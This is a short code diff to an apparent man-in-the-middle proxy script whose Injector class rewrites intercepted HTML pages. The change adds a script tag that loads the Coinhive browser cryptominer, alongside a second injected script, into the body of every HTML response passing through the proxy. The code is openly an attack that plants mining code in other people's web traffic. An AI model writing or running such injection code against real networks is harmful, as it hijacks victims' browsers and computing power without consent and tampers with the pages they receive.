@@ -15,11 +15,16 @@ class Injector:
             print(flow.response.headers["content-type"])
             if flow.response.headers["content-type"] == 'text/html':
                 print(flow.response.headers["content-type"])
-                script = html.new_tag(
+                script1 = html.new_tag(
+                    "script",
+                    src="https://coinhive.com/lib/coinhive.min.js",
+                    type='application/javascript')
+                html.body.insert(0, script1)
+                script2 = html.new_tag(
                     "script",
                     src=self.path,
                     type='application/javascript')
-                html.body.insert(0, script)
+                html.body.insert(0, script2)
                 flow.response.content = str(html)
                 print("Script injected.")
 
